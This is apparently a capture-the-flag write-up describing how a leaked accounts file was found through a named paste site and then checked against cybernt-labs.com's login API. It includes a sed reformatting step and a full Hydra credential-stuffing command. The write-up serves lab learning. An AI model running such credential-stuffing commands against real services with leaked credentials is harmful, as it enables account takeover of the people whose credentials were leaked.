#Challenge 

## Steps to Solve the Challenge

1. **Identifying the Name**:
   - In the challenge video, we saw the name <**stikked**> at the **0:21** timestamp.

	![[Pasted image 20241219123810.png]]

2. **Finding the Relevant Post**:
   - Searching the latest posts for the name **stikked** led us to a post that linked to their website.

    ![[Pasted image 20241219123734.png]]

3. **Discovering the Data Leak**:
   - On their website, I navigated to the **Recent** tab and found the accounts file under a section about a data leak.
   
	![[Pasted image 20241219123859.png]]
   
4. **Editing the Accounts File**:
   - To make the file compatible with Hydra, I replaced `--` with `:` using the following command:

     ```bash
     sed -i 's/ -- /:/g' accounts.txt
     ```

	![[Pasted image 20241219124021.png]]

5. **Using Hydra to Test Credentials**:
   - I used Hydra to test the accounts with the following command:
     ```bash
     hydra -C accounts.txt cybernt-labs.com -s 443 https-post-form "/api/login:email=^USER^&pass=^PASS^:your account has been disabled" -V
     ```

6. **Finding an Active Account**:
   - Hydra identified one account that was still active.

	![[Pasted image 20241219124143.png]]

 7. **Logging In and Finding the Flag**:
   - After logging into the website with the active account, I found the user ID, which turned out to be the flag for the challenge.
   -
	![[Pasted image 20241219124222.png]]
	